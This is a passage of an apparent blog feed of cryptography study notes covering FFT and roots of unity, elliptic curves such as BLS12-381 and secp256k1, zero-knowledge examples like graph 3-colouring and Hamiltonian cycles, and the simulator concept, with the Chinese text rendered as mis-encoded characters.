‡çš„ç›¸äº’è½¬æ¢ï¼Œè®¡ç®—éå¸¸éº»çƒ¦ã€‚</p><p>å…·æœ‰å®éƒ¨å’Œè™šéƒ¨çš„å¤æ•°åšä¹˜æ³•ç­‰è¿ç®—å®é™…ä¸Šå¾ˆä¸æ–¹ä¾¿ï¼Œä½†æ˜¯å€ŸåŠ©äºæ¬§æ‹‰å…¬å¼ï¼Œè™½ç„¶åŠ å‡æ³•è®¡ç®—ä¾ç„¶å¾ˆéº»çƒ¦ï¼Œä½†æ˜¯å¤æ•°çš„ä¹˜é™¤æ³•å˜å¾—ç®€å•èµ·æ¥:<strong>å¤æ•°ç›¸ä¹˜æ—¶,æ¨¡é•¿ç›¸ä¹˜,å¹…è§’ç›¸åŠ </strong>ï¼š</p><p>è®¾å•ä½åœ†ä¸Šå¤æ•°ç‚¹ <span class="math inline">\(x_1,x_2\)</span>ç›¸ä¹˜ï¼Œ</p><p><span class="math display">\[(cosx_1+isinx_1)(cosx_2+isinx_2) = e^{ix_1}*e^{ix_2} = e^{i(x_1+x_2)}=cos(x_1+x_2)+i sin(x_1+x_2)\]</span></p><p>å°†å•ä½åœ†çš„è§’åº¦å‡åˆ†ä¸º nä»½,å¹¶é€‰æ‹©å¯¹åº”çš„ä»åŸç‚¹å‘å¤–è¾å°„çš„åŠå¾„åšå‘é‡ï¼Œå…¶ä¸­å¹…è§’ä¸ºæ­£ä¸”æœ€å°çš„å‘é‡ç§°ä¸ºn æ¬¡å•ä½å‘é‡ï¼Œè®°ä¸º <span class="math inline">\(\omega_n^1\)</span>ã€‚<span class="math inline">\(w_n^k = e^{\frac{2 \pi k}{n}i}\)</span>.</p><p>å› æ­¤ï¼Œå•ä½å‘é‡æœ‰ä»¥ä¸‹è¿ç®—æ€§è´¨:</p><ol type="1"><li><span class="math inline">\(\omega_i = \omega^i\)</span>, where<span class="math inline">\(\omega\)</span> is a generator.</li><li><span class="math inline">\(\omega_n^k = \omega_n^{k-1}*w^1_n \quad(2 \le k \le n)\)</span></li><li><span class="math inline">\(\omega_{2n}^{2k} = w^k_n\)</span>ï¼Œä»å‡ ä½•ç†è§£åˆ† 2n ä»½å’Œåˆ† n ä»½ï¼Œç„¶åæ¯”ä¾‹ä¸€æ ·ï¼Œè¾è§’ä¸€æ ·ã€‚</li><li><span class="math inline">\(w^{k+\frac{n}{2}} = -w^k_n\)</span>,å¤šè½¬äº†åŠåœˆï¼Œæ–¹å‘ç›¸åã€‚</li></ol><p><strong>æ³¨æ„: root of unity çš„é˜¶é€‰æ‹© 2^mï¼Œ2çš„æ¬¡å¹‚ã€‚è¿™ä¸å­ç¾¤çš„é˜¶å’Œç¾¤çš„é˜¶çš„å…³ç³»æœ‰å…³</strong></p><h2 id="discrete-fourier-transform">Discrete Fourier Transform</h2><p>FFT åˆ©ç”¨å•ä½æ ¹çš„æ€§è´¨ï¼Œå°†å¤šé¡¹å¼åˆ†æˆå¥‡å¶ï¼Œé‡‡ç”¨åˆ†æ²»æ–¹å¼æ“ä½œã€‚</p><p>DFT: è€ƒè™‘ n é¡¹ï¼ˆdeg=n-1ï¼‰å¤šé¡¹å¼ A(x), å…¶ç³»æ•°å‘é‡ä¸º <spanclass="math inline">\((a_0, a_1, \cdots, a_{n-1})\)</span>, å°† næ¬¡å•ä½æ ¹çš„ 0~n-1 æ¬¡å¹‚åˆ†åˆ«ä»£å…¥ A(x) å¾—åˆ°å…¶ç‚¹å€¼å‘é‡ <spanclass="math inline">\((A(w_n^0), A(w_n^1), \cdots,A(w_n^{n-1}))\)</span>. æ³¨æ„: è¿™é‡Œå‡è®¾ n æ˜¯ 2 çš„å¹‚æ¬¡ã€‚</p><p>å¯¹äº <span class="math inline">\(A(x) = a_0 + a_1x^1 + \cdots +a_{n-1}x^{n-1}\)</span>ï¼Œå°†å…¶å¥‡å¶åˆ†å¼€ï¼Œå¾—åˆ°:</p><p><span class="math inline">\(A(x) = a_0 + a_2x^2 + a_4x^4 + \cdots +a_{n-2}x^{n-2} + x(a_1 + a_3x^2 + a_5x^4 + \cdots +a_{n-1}x^{n-2})\)</span></p><p><span class="math inline">\(AL(x) = a_0 + a_2x^2 + a_4x^4 + \cdots +a_{n-2}x^{\frac{n-2}{2}}\)</span></p><p><span class="math inline">\(AR(x) = a_1 + a_3x^2 + a_5x^2 + \cdots +a_{n-1}x^{\frac{n-2}{2}})\)</span></p><p><span class="math inline">\(A(x) = AL(x^2) + xAR(x^2)\)</span></p><p>ç„¶åå°†å•ä½æ ¹åˆ†åˆ«å¸¦å…¥ AL(x^2) å’Œ AR(x^2)</p><p>è®¾ <span class="math inline">\(0 \le k \le \frac{n}{2}-1 \quad k \inZ\)</span> , æ ¹æ®å‰é¢æåˆ°çš„å•ä½æ ¹çš„ç‰¹æ€§ï¼Œ<spanclass="math inline">\(A(w_n^k) = AL(w_n^{2k}) + w_n^{k} AR(x^{2k}) =AL(w_{n/2}^{k}) + w_n^{k} AR({n/2}^{k})\)</span></p><p>å½“ $ k+ n-1$,</p><p><span class="math display">\[A(w_n^{k+\frac{n}{2}})= AL(w_{n}^{2k+n}) + w_n^{k+\frac{n}{2}} AR(w_{n}^{2k+n})= AL(w_{n/2}^{k}) - w_n^{k} AR(w_{n/2}^{k})\]</span></p><p>æ³¨æ„ k ä¸ k+n/2 å–éäº†[0ï¼Œn-1]ä¸­çš„ n ä¸ªæ•´æ•°ï¼Œä¿è¯äº†å¯ä»¥ç”±è¿™ nä¸ªç‚¹å€¼åæ¨è§£å‡ºç³»æ•°.</p><p>å› æ­¤ï¼Œåªéœ€è¦çŸ¥é“<span class="math inline">\(AL(x)\)</span> å’Œ <spanclass="math inline">\(AR(x)\)</span> åˆ†åˆ«åœ¨ <spanclass="math inline">\(w_{n/2}^0,w_{n/2}^1,\cdots,w_{n/2}^{n/2-1}\)</span>çš„å–å€¼ï¼Œå°±å¯ä»¥åœ¨ O(n) æ—¶é—´å¾—å‡º A(x) çš„å–å€¼ï¼Œè€ŒäºŒè€…æ˜¯A(x)çš„ä¸€èˆ¬è§„æ¨¡ï¼Œå¯è½¬åŒ–ä¸ºå­é—®é¢˜é€’å½’æ±‚è§£ï¼Œæ—¶é—´å¤æ‚åº¦: T(n) = 2T(n/2)+O(n)= O(nlogn).</p><h2 id="inverse-discrete-fourier-transform">Inverse Discrete FourierTransform</h2><p>ä½¿ç”¨å¿«é€Ÿå‚…é‡Œå¶å˜æ¢å°†ç‚¹å€¼è¡¨ç¤ºçš„å¤šé¡¹å¼è½¬åŒ–ä¸ºç³»æ•°è¡¨ç¤ºï¼Œè¿™ä¸ªè¿‡ç¨‹å«åšç¦»æ•£å‚…é‡Œå¶åå˜æ¢ï¼ˆInverseDiscrete Fourier Transformï¼‰ã€‚</p><h2 id="references">References</h2><p>æ¨è Introduction to Algorithmsï¼Œè®²è§£æ€è·¯å¾ˆå¥½ï¼Œä» evaluation onpoint-value polynomial åˆ° FFT,é€šè¿‡ Vandermonde matrix æ±‚é€†æ¥è®²è§£ inverseFFT.</p><ol type="1"><li>TODO -[ ] <ahref="http://mitpress.mit.edu/9780262046305/introduction-to-algorithms/">Introductionto Algorithms CHAPTER 32: POLYNOMIALS AND THE FFT</a></li><li><ahref="https://zh.wikipedia.org/wiki/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2">å‚…é‡Œå¶å˜æ¢- ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦</a></li><li>TODO -[ ] <ahref="https://betterexplained.com/articles/an-interactive-guide-to-the-fourier-transform/">AnInteractive Guide To The Fourier Transform â€“ BetterExplained</a></li><li>TODO -[ ] <ahref="https://jakevdp.github.io/blog/2013/08/28/understanding-the-fft/">Understandingthe FFT Algorithm | Pythonic Perambulations</a></li><li><a href="https://www.thefouriertransform.com/">FourierTransform</a></li><li>^4 <ahref="https://www.robots.ox.ac.uk/~sjrob/Teaching/SP/l7.pdf">DFT.pdf</a></li><li><ahref="https://towardsdatascience.com/understanding-discrete-convolution-as-polynomial-multiplication-5f94a13acd55">UnderstandingDiscrete Convolution as Polynomial Multiplication | by Shailesh Kumar |Towards Data Science</a></li><li>[^7] <ahref="https://github.com/zlotus/notes-linear-algebra/blob/master/chapter27.ipynb">gilbertstrang linear-algebra/chapter27.ipynb GitHub</a></li><li><ahref="https://www.luogu.com.cn/blog/command-block/fft-xue-xi-bi-ji">å‚…é‡Œå¶å˜æ¢(FFT)å­¦ä¹ ç¬”è®°- command_block çš„åšå®¢ - æ´›è°·åšå®¢</a></li><li><ahref="https://zhuanlan.zhihu.com/p/31584464">ä¸€å°æ—¶å­¦ä¼šå¿«é€Ÿå‚…é‡Œå¶å˜æ¢ï¼ˆFastFourier Transformï¼‰ - çŸ¥ä¹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5.æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿</title>
      <link href="/blog/2023/03/24/crypto/math/6.ecc_finitefield/"/>
      <url>/blog/2023/03/24/crypto/math/6.ecc_finitefield/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿">5.æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿</h1><p>generatorå¯¹æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿æ˜¯éå¸¸é‡è¦çš„ï¼Œå› ä¸ºæ¤­åœ†æ›²çº¿ä¸Šçš„è¿ç®—éƒ½æ˜¯ä¸ generatorç›¸å…³çš„ã€‚</p><p>é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„ generatorï¼Œä½¿å¾—æ•´ä¸ª prime field è¶³å¤Ÿå¤§ï¼Œè€Œä¸” orderè¶³å¤Ÿé«˜(è¶³å¤Ÿå¤šåœ°éå†ç‚¹),å¯ä»¥æå¤§åœ°å¢å¼ºæ¤­åœ†æ›²çº¿çš„å®‰å…¨æ€§ã€‚</p><p>In most situations, an Elliptic Curve E is the graph of an equationof the form <span class="math inline">\(y^2 = x^3 + Ax + B\)</span>,where A and B are constants. This is called the Weierstrass equation foran elliptic curve.</p><p>TODO: <ahref="http://www.umsl.edu/~siegelj/information_theory/projects/elliptic_curves_group_law.pdf">elliptic_curves_group_law.pdf</a></p><h2 id="å¸¸è§æ¤­åœ†æ›²çº¿">å¸¸è§æ¤­åœ†æ›²çº¿</h2><p>BLS12-381 p =0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001Generator</p><h3 id="bls12-381">BLS12-381</h3><p>BLS12-381 (2017) or 255-bit curve (EIP-4844 KZG commitment curve).Developed by Sean Bowe for ZCash, and will be used by Ethereum</p><p>Many protocols are putting it to use for digital signatures andzero-knowledge proofs: Zcash, Ethereum 2.0, Skale, Algorand, Dfinity,Chia, and more.</p><p>BLS12-381 is a pairing-friendly elliptic curve. Pairing-basedcryptography has been developed over the last couple of decades,enabling useful new applications such as short digital signatures thatare efficiently aggregatable, identity-based cryptography, single-roundmulti-party key exchange, and efficient polynomial commitment schemessuch as KZG commitments.</p><p>The basic equation of the BLS12-381 curve is <spanclass="math inline">\(y^2 = x^3 + 4\)</span></p><p>TODO - [ ] ä¸ºä»€ä¹ˆæ—¢æœ‰ field order åˆæœ‰ subgroup orderï¼Ÿ</p><p>Field modulus:<code>0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab field order = 4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</code></p><p>Subgroup sizeã€Order of BLS12-381 elliptic curve:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">group order = <span class="built_in">hex</span>(<span class="number">52435875175126190479447740508185965837690552500527637822603658699938581184513</span>)</span><br><span class="line">order= <span class="number">0x73eda753299d7d483339d80809a1d80553bda402fffe5bfeffffffff00000001</span></span><br></pre></td></tr></table></figure><p>è¯¥æ›²çº¿çš„é˜¶æœ€åå¾ˆå¤š 0ï¼Œç„¶åæœ‰ä¸€ä¸ª 1ï¼Œæ˜¯å› ä¸º order-1æ˜¯ä¹˜æ³•ç¾¤çš„é˜¶ï¼Œç„¶åå¯ä»¥äº§ç”Ÿå…·æœ‰é«˜é˜¶çš„ root of unity çš„ä¹˜æ³•å­ç¾¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PRIMITIVE_ROOT = 5</span><br><span class="line">MODULUS = b.curve_order</span><br><span class="line">def get_root_of_unity(order):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Returns a root of unity of order &quot;order&quot;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    assert (MODULUS - 1) % order == 0</span><br><span class="line">    return pow(PRIMITIVE_ROOT, (MODULUS - 1) // order, MODULUS)</span><br></pre></td></tr></table></figure><p>æ³¨æ„: order é€‰æ‹© 2 å¹‚æ¬¡ ref: <ahref="https://sharmaeklavya2.github.io/theoremdep/nodes/abstract-algebra/groups/cyclic-groups/order-of-elements-in-cyclic-group.html#:~:text=In%20a%20cyclic%20group%20of,%E2%88%88%20Z%20n%20d%20%E2%88%97%20%7D%20.">Orderof elements in cyclic group - TheoremDep</a></p><p>Ethereum EIP-4844 å¼•å…¥ KZG commitment å¯¹åˆ†ç‰‡äº¤æ˜“è¿›è¡Œå‹ç¼©è¯æ˜: <ahref="https://eips.ethereum.org/EIPS/eip-4844">EIP-4844: Shard BlobTransactions</a></p><p><a href="https://hackmd.io/@benjaminion/bls12-381">BLS12-381 For TheRest Of Us - HackMD</a> <a href="http://aandds.com/blog/bls.html">BLSCurves (BLS12-381) and BLS Signatures</a></p><h2 id="alt_bn128">alt_bn128</h2><p>ALT_BN128 (2015),Also known as BN254, 254-bit curve (used in Ethereumzkp). Developed by SCIPR-lab.</p><p>pairing friendly</p><p>order of bn128:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hex(21888242871839275222246405745257275088548364400416034343698204186575808495617)</span><br><span class="line">0x30644e72e131a029b85045b68181585d2833e84879b9709143e1f593f0000001</span><br></pre></td></tr></table></figure><p>Generator 5.</p><h2 id="the-secp256k1-curve">the secp256k1 curve</h2><p>Secp256k1 is the name of the elliptic curve used by Bitcoin toimplement its public key cryptography, ECDSA algorithm. All points onthis curve are valid Bitcoin public keys.</p><p>Formula:</p><p>For secp256k1, a=0 and b=7, yields the equation <spanclass="math inline">\(y^2 = x^3 + 7\)</span></p><h2 id="jacobi-curve">Jacobi curve</h2><blockquote><p>In mathematics, the Jacobi curve is a representation of an ellipticcurve different from the usual one defined by the Weierstrass equation.Sometimes it is used in cryptography instead of the Weierstrass formbecause it can provide a defence against simple and differential poweranalysis style (SPA) attacks;</p></blockquote><p><a href="https://en.wikipedia.org/wiki/Jacobian_curve">Jacobian curve- Wikipedia</a></p><p><strong>Jacobian Coordinates</strong> are used to represent ellipticcurve points on prime curves. They give a speed benefit over<strong>Affine Coordinates</strong> when the cost for field inversionsis significantly higher than field multiplications.</p><p>note: ç›¸åŒçš„ç‚¹å¯èƒ½ Jacobian point çš„åæ ‡ä¸ä¸€æ ·, ç”¨ <code>==</code>åˆ¤æ–­å³å¯ã€‚</p><h2 id="references">References</h2><ul class="task-list"><li><label><input type="checkbox" />TODO complete reading</label></li></ul><ol type="1"><li><a href="https://hackmd.io/@benjaminion/bls12-381">BLS12-381 For TheRest Of Us - HackMD</a></li><li><ahref="https://github.com/zcash/librustzcash/blob/6e0364cd42a2b3d2b958a54771ef51a8db79dd29/pairing/src/bls12_381/README.md#generators">librustzcash/pairing/src/bls12_381/README.mdat 6e0364cd42a2b3d2b958a54771ef51a8db79dd29 Â·zcash/librustzcash</a></li><li><ahref="https://members.loria.fr/AGuillevic/pairing-friendly-curves/">Pairing-friendlycurves â€“ Aurore GUILLEVIC</a></li><li><a href="https://xn--2-umb.com/22/pairings/">Math &amp;Engineering</a></li><li><a href="https://hackmd.io/@vivi432/bn128-in-c">BN128 curve â€” Cimplementation - HackMD</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Three ZK Examples</title>
      <link href="/blog/2023/03/24/crypto/zk/5.three_problem/"/>
      <url>/blog/2023/03/24/crypto/zk/5.three_problem/</url>
      
        <content type="html"><![CDATA[<h1 id="three-zk-examples">Three ZK Examples</h1><h2 id="graph-3-colouring">Graph 3-colouring</h2><p>Details can be seen in the following two great lecture notes, which Ihave attached here. <ahref="./media/cornell_lecture18_easy_understand.pdf">cornell_lecture18more easier to understand</a> <ahref="./media/cmu_lecture23_more_formal.pdf">cmu_lecture23 moreformal</a> There is a visual demonstration for Graph 3-coloring fromMIT, <ahref="http://web.mit.edu/~ezyang/Public/graph/svg.html">Interactive zeroknowledge 3-colorability demonstration</a>.</p><p>The concept of simulator can be seen in note [4.simulator.md]</p><p>Some points should be highlight to understand the above materialsbetter and deeper.</p><ol type="1"><li><p>There are some common knowledge for the prover and verifers about3-colorable graphs. The graph, three colors used, and the principles ofthe ZK-Graph 3-coloring protocol is known for both prover and theverifers. Therefore, the brute force from malicious verifier about thegraph is nearly impossible. The reason is that the prover randomlypermutes the colors in each round, and the color of a particular edgemay be different in different rounds. The randomness make the bruteforce nearly impossible.</p></li><li><p>The verifier can only tell that the prover has at least one truewitness, not whether it has a different true witness than ituses.</p></li><li><p>The answer of the two exercises from the visual demonstration ofMIT.</p><blockquote><p>Exercise 1: Currently, you can only select adjacent pairs of nodes tocheck. Would the proof still be zero knowledge if you could pickarbitrary pairs of nodes to check?</p></blockquote><p>No. Why is this a zero-knowledge proof currently? the reason is thatthe verifier already knows the property that no two vertices of the samecolor are connected by an edge. If the verifier wants, it could alsogenerate the same graph with the specific edge it just verified usingtwo vertices of different colors. So in some sense, the information theprover give the verifier doesn't tell the verifier anything that itdidn't already know.</p><p>The idea/intuition definition of zero-knowledge (Just three differentways of expressing the same thing)</p><ol type="1"><li>A proof system is zero knowledge if the verifier did not learnanything after the interaction that he could not have learned on hisown.</li><li>the proof should reveal nothing to the verifier beyond what theverifier already knows.</li><li>Proof pi reveals nothing about the secret witness, other than itsexistence.</li></ol><p>When you can only select adjacent pairs of nodes to check, you justget information about the (specific) adjacent pairs of nodes that arecolored differently. This kind of information is what the verifieralready knows, making it not knowledge for the verifier, because it canhelp nothing about the prover solving the 3-coloring problem. However,when the verifier can choose any pair of nodes to check, the verifiercan gain some additional knowledge because it starts to know which twoare the same color and which two are different colors. As the number ofverifications increases, the accumulated knowledge may lead to theleakage of secrets.</p><blockquote><p>Exercise 2: The equation currently being used for confidence is1-(1/E)^n, where E is the number of edges in the graph, and n is thenumber of trials run. Is this the correct equation? Why is there noprior?</p></blockquote><p>No, For n-iteration, the confidence metric should be <spanclass="math inline">\(1-(1-1/|E|)^n\)</span>. The colored graphcommitted by a cheating prover has at least 1 edge whose two endpointsare colored with the same color. The verifier can catch him wheneverhappens to request the colors for this edge with probability 1/|E|. Byperforming n sequential repetitions of the protocol, we can get thesoundness error down to <spanclass="math inline">\((1-1/|E|)^n\)</span>, which is negligible. Hencethe confidence metric should be <spanclass="math inline">\(1-(1-1/|E|)^n\)</span></p><p>Why is there no prior?</p><p>The prover can randomly permutate the secret coloring in each round,which makes each trial or verification independent of theother.</p></li></ol><h2 id="hamilton-cycles-of-graph">Hamilton Cycles of Graph</h2><p>Hamilton cycle: a cycle going through every vertex of the graphexactly once and return to the start.</p><p>Hamilton Cycles is a NP problem. If you know a zero-knowledgeprotocol for Hamilton Cycles, you can reduce all NP problem to use thisprotocol, which means you know a zero-knowledge protocol for all NPproblem.</p><p>Graph Hamiltonicity is also covered in <ahref="./media/cornell_lecture18_easy_understand.pdf">cornell_lecture18more easier to understand</a>.</p><p>P: know a hamilton cycle C on graph G. Each round:</p><ol type="1"><li>P: random permutation <span class="math inline">\(\phi\)</span> overG</li><li>P: commit two commitment: the permutation <spanclass="math inline">\(\phi\)</span> and edges in <spanclass="math inline">\(\phi(G)\)</span></li><li>V: The verifier flip coin to get a challenge bit b âˆˆ {0, 1}.</li><li>if b=0, for permutated graph, P reveal the permutation <spanclass="math inline">\(\phi\)</span> and <spanclass="math inline">\(C_{i,j}\)</span> edges in <spanclass="math inline">\(\phi\)</span> to V for isomorphic verification,checking whether the graph is isomorphic to the public graph G</li><li>if b=1, for hamilton cycle, P translate the Hamiltonian cycle <spanclass="math inline">\(C_H\)</span> onto <spanclass="math inline">\(\phi(G)\)</span>, and reveal the translatedcorresponding edges of hamiltonian cycle in <spanclass="math inline">\(\phi(G)\)</span> to verifier. The verifier unveilthe received edges and check if they are a Hamiltonian cycle on thepermuted graph <span class="math inline">\(\phi(G)\)</span>.</li></ol><p>Note: verifier can simulate a permutated graph or a hamilton cycle,but not both at the same time.</p><p><ahref="https://people.eecs.berkeley.edu/~sanjamg/classes/cs294-spring16/scribes/7.pdf">HamiltonianCycles Lecture 7: Zero Knowledge II</a></p><p>Q: Why verifier need to flip a coin? A: If the challenge preferenceis known by proof, which might be malicious, the prover can forge themust-chosen one arbitrarily without caring about the other one, whichmake the proof invalid.</p><p>Q: One issuse is this protocol requires interaction. The interactiveproof is non-practical for real-world application,such as blockchain,How about non-interactive proof? A: Fiat-Shamir heuristic: a way to turninterative proo to non-interactive proof and still maintain goodproperties.</p><p>The prover try to simulate the verifier by help the verifier pick therandomness. The prover is protentially malicious, and if it know inadvance what coins the verifier will flip, it can do bad things. To makenon-interactive proof, you need to make sure the prover cannot simulatethe coin to its advantage.</p><p>Fiat-Shamir heuristic: The prover can simulate the verifier byrunning a cryptographic hash function on the transcript to generate therandomness, so P cannot cheating by adversarily choosing favorableso-call random but random challenge. You force it to flip a coins byapplying a cryptographic hash function to everything that has happenedin this interaction.</p><p>Q: Another issuse is the proof is so big. How to make it succinct?A:</p><h2 id="todo--">TODO - [ ]</h2><h2 id="references">References</h2><ol type="1"><li><ahref="https://www.cs.cmu.edu/~goyal/s18/15503/scribe_notes/lecture23.pdf">cmuscribe notes lecture23</a></li><li><ahref="http://www.cs.cornell.edu/courses/cs6830/2011fa/scribes/lecture18.pdf">cornellscribes notes lecture18</a></li></ol><ul><li>[] <a href="https://intensecrypto.org/public/">An intensiveintroduction to cryptography-Chapter 13-BOAZ BARAK</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>The concept of simulator for Zero Knowledge property</title>
      <link href="/blog/2023/03/23/crypto/zk/4.simulator/"/>
      <url>/blog/2023/03/23/crypto/zk/4.simulator/</url>
      
        <content type="html"><![CDATA[<h1 id="the-concept-of-simulator-for-zero-knowledge-property">Theconcept of simulator for Zero Knowledge property</h1><h2 id="computational-indistinguishability">Computationalindistinguishability</h2><p>TODO - [] todo</p><h2 id="knowledge-vs-information">Knowledge vs information</h2><p>Refererce: Foundations of Cryptography - Basic Tools 4.1.2. GainingKnowledge, p211</p><h2 id="zero-knowledge-property">zero knowledge property</h2><p>For zero knowledge property, simulator is commonly used to prove theproperty of zero knowledge.</p><p>In cryptographic protocols, the simulator always has more power thanthe real prover. Sometimes the simulator can generate the parts of thetranscript in a different order. Sometimes the simulator can "rewindtime" -- so the verifier asks a question, and then we rewind time andstart the transcript over, knowing what the verifier is going to ask.Sometimes the simulator literally has more computational power than thereal prover. Sometimes the simulator has some extra information that thereal prover doesn't have (like a trapdoor to some common referenceinformation used in the proof).</p><p>Simulator is a rigorous way of formalizing the following idea: theverifier didn't learn anything because "they could have generated thetranscript themselves.". In other word, the intuition of the simulatoris, from the point of view of the verifier, a statistically negligibleequal distribution output compared to a real prover in terms ofprobability difference, but without having access to the prover.Expected running time of simulator must be polynomial in problemsize.</p><p>The simulator is an efficient machine that has oracle access to theverifier and given the statement as input, it, in place of prover,simulates the view of the (adversarial) verifier. Since the simulationis possible using only the statement, it can be <strong>argued that theverifier learns nothing more (about the witness).</strong></p><p>The extractor concerns zero-knowledge proofs of knowledge which arezero-knowledge proofs which additionally <strong>guarantee that theprover indeed holds the witness.</strong> In particular, the extractorgiven access to the prover (which it can potentially rewind) can extractthis witness for example by rewinding it.</p><p>A key role in proving that an interactive system has the property ofzero knowledge is played by the Simulator (S), which simulates P butdoes not have access to the witness. His contribution is as follows: Vinteracts with S. At some point V will put S in the 'difficult position'of not being able to answer a question, as he does not have access tothe witness. In this case we return the V movie to a state before theunpleasant question (rewind) and run the protocol from that pointonwards. If V (with continuous rewinds) finally accepts S's proof, theprotocol has the status of zero knowledge, as V can not distinguishbetween a P who knows the witness and an S who pretends. That is, V doesnot export any additional information from the protocol (since in thesecond case there is no information to export).</p><p>Simulation of proof in place of P interacts with V. We can notdistinguish the interactions âŸ¨S, VâŸ© and âŸ¨P, VâŸ©. We also allow rewinds:If at some point V 'asks' something he can not answer, S then stop -rewind Zero knowledge if V at some point accepts (even withrewinds).</p><p>Why: Cannot distinguish P (having witness) from S (not available). Aslong as S remains PPT Specifically: A V that extracts information from Pwill extract the same information from S (where there is nothing toexport)</p><h2 id="formal-definition-of-zero-knowledge-with-turing-machine">Formaldefinition of zero-knowledge with Turing machine</h2><p>A formal definition of zero-knowledge has to use some computationalmodel, the most common one being that of a Turing machine.</p><h2 id="simulator-and-knowledge-extractor">Simulator and Knowledgeextractor</h2><ul><li>simulator: If the simulator have the ability of cheating withoutsuperpower, the protocol can be proved to be unsound</li><li>extractor: If the extractor can extract the knowledge of Aliceentirely by leveraging time rewind in the ideal world, the goal that aAlice without knowledge cannot be knowledge extracted is guaranteed, andthe soundness can be proved.</li></ul><p>Better look at <ahref="https://github.com/sec-bit/learning-zkp/blob/master/zkp-intro/2/zkp-simu.md">learning-zkp/zkp-simu.mdat master Â· sec-bit/learning-zkp Â· GitHub</a></p><h2 id="references">References</h2><ol type="1"><li><ahref="https://crypto.stackexchange.com/questions/96587/simulator-vs-prover-zero-knowledge-property">Simulatorvs Prover -- Zero Knowledge Property - Cryptography StackExchange</a></li><li><ahref="https://crypto.stackexchange.com/questions/67610/what-is-purpose-of-a-simulator-and-extractor-in-zero-knowledge-proof-protocols">provablesecurity - What is purpose of a simulator and extractor in zeroknowledge proof protocols? - Cryptography Stack Exchange</a></li><li><ahref="https://en.wikipedia.org/wiki/Zero-knowledge_proof">Zero-knowledgeproof - Wikipedia</a></li></ol><ul class="task-list"><li><label><input type="checkbox" /><ahref="https://blog.cryptographyengineering.com/2014/11/27/zero-knowledge-proofs-illustrated-primer/">ZeroKnowledge Proofs: An illustrated primer â€“ A Few Thoughts onCryptographic Engineering</a></label></li><li><label><input type="checkbox" /><ahref="https://blog.cryptographyengineering.com/2017/01/21/zero-knowledge-proofs-an-illustrated-primer-part-2/">ZeroKnowledge Proofs: An illustrated primer, Part 2 â€“ A Few Thoughts onCryptographic Engineering</a></label></li><li><label><input type="checkbox" /><ahref="https://medium.com/magicofc/interactive-proofs-and-zero-knowledge-b32f6c8d66c3">OnInteractive Proofs and Zero-Knowledge: A Primer | by Yannik GoldgrÃ¤be |CÂ³AI | Medium</a></label></li></ul>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Evolution of Poof</title>
      <link href="/blog/2023/03/22/crypto/zk/3.proof_evolving/"/>
      <url>/blog/2023/03/22/crypto/zk/3.proof_evolving/</url>
      
        <content type="html"><![CDATA[<h1 id="explain-the-evolution-of-poof">Explain the Evolution ofPoof</h1><p>To explain the term "zero knowledge proof", we first need to define"proof", "knowledge", and then we can proceed to explain what "zeroknowledge" means.</p><p>To know the popular ZK-SNARK (Zero-Knowledge Succinct Non-interactiveARguments of Knowledge), the distinction between "arguments" and "proof"is also need to be elaborated.</p><h2 id="proof-system">proof system</h2><blockquote><p>if the part of history is too long to read, you can directly read thesubtitles</p></blockquote><p>The 'subtitles' are listed as follows:</p><ul class="task-list"><li><label><input type="checkbox" />TODO: read and digest <ahref="https://nibnalin.me/assets/zk.pdf">A Succinct Story of ZeroKnowledge</a></label></li></ul><ol type="1"><li><p>Ancient Greece: Proof == insight Mathematical proof is originatefrom ancient Greece, where the axiom and logic is foundï¼Œfor example,Goldbach conjecture</p><p>Ever since Leibniz in the 17th century, people have dreamed of<strong>a mechanical way to do this automatically</strong>, rather thanrelying on a stroke of genius</p></li><li><p>Early twentieth century: Proof == symbolic reasoning</p><p>A symbolic system for formalizing logic is defined. The proof is thereasoning process written in the symbolic language of formal logic</p><p>Unfortunately, Godel's proof of Godel's incompleteness theorem in1931 and Turing's proof of the undecidability of Turing's machinestopping problem in 1936 put to rest once and for all the centuries-oldillusion that no axiomatic system, however elaborate, could capture allthe truth.</p></li><li><p>60s: Proof == program It is true that the use of computers caneffectively help the mathematician's mind to reach more unknown spaces,but finding proof is still the most challenging work and verifying proofhas to be a simple mechanical and limited work, because of the naturalasymmetry.</p></li><li><p>80s: Proof == interaction Goldwasser, Micali and Rackoff [GMR85]proposed "The knowledge complexity of interactive proof systems."(äº¤äº’å¼è¯æ˜ç³»ç»Ÿä¸­çš„çŸ¥è¯†å¤æ‚æ€§). GMR85 introduced the notion 